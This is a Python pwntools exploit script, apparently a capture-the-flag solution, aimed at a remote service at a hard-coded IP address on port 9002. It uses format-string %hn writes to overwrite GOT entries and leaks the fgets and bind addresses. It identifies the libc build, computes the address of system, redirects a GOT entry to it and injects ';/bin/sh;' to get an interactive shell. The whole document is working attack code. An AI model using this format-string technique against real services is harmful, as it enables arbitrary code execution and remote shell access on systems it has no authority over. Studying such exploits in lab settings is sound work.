from pwn import *

#s = remote("localhost",9002)
s = remote("34.198.96.6",9002)

loop = 0x08048ACC
half1 = 0x8acc
half2 = 0x804

off1 = half1-0x1f
off2 = (half2-off1-0x1f)&0xffff

fmt = "%%.%du"%off1+"%8$hn" + "%%.%du"%off2+"%9$hn"
s.sendline(fmt)

#puts got entry
writeptr = p32(0x804b034)+p32(0x804b036)
s.sendline(writeptr)
s.recvuntil("username: ")
s.sendline(writeptr)
s.recvuntil("username: ")
s.sendline(writeptr)
s.recvuntil("username: ")

fmt = "%8$s-ABCD-%9$s"
s.sendline(fmt)

# p32(fgets)+p32(bind) (got)
readptr = p32(0x804B01c)+p32(0x804B048)
s.sendline(readptr)

s.recvuntil("username: ")
fgets = s.recvuntil("-ABCD-")
bind = s.recvline()

fgets_ptr = u32(fgets[:4])
bind_ptr = u32(bind[:4])

print "fgets: %x" % fgets_ptr
print "bind: %x" % bind_ptr

s.sendline(readptr)
s.sendline(readptr)

'''
sam@ubuntu:~/tools/libc-database$ ./find fgets f75ca2a0 bind f7652470
ubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.9_amd64)
sam@ubuntu:~/tools/libc-database$ ./dump
Usage: ./dump id [name1 [name2 ...]]
sam@ubuntu:~/tools/libc-database$ ./dump libc6-i386_2.19-0ubuntu6.9_amd64 system
offset_system = 0x0003fe70
offset_fgets = 0x000632a0
'''

s.recvuntil("Enter name:")

fgets = 0xf75ca2a0
system = fgets - 0x632a0 + 0x3fe70

half1 = system & 0xffff
half2 = (system >> 16)

off1 = half1-0x1f
off2 = (0x10000+half2-off1-0x1f)&0xffff

fmt = "%%.%du"%off1+"%8$hn" + "%%.%du"%off2+"%9$hn" + ";/bin/sh;"
s.sendline(fmt)

#puts got entry
writeptr = p32(0x804b014)+p32(0x804b016)
s.sendline(writeptr)
s.recvuntil("username: ")

s.interactive()
